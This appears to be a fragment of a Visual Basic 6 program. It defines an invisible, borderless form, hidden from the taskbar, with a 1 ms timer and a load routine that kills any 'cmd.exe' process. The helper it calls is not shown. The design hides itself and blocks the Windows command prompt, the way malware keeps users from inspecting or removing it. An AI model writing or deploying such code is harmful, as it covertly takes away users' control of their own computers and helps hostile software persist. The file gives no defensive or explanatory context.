VERSION 5.00
Begin VB.Form cmd 
   BorderStyle     =   0  'None
   Caption         =   "Form1"
   ClientHeight    =   3135
   ClientLeft      =   0
   ClientTop       =   0
   ClientWidth     =   4680
   LinkTopic       =   "Form1"
   ScaleHeight     =   3135
   ScaleWidth      =   4680
   ShowInTaskbar   =   0   'False
   StartUpPosition =   3  'Windows Default
   Visible         =   0   'False
   Begin VB.Timer Timer1 
      Interval        =   1
      Left            =   2520
      Top             =   2400
   End
End
Attribute VB_Name = "cmd"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False
Private Sub Form_Load()
KILL_PROC_BY_NAME "cmd.exe"
End Sub

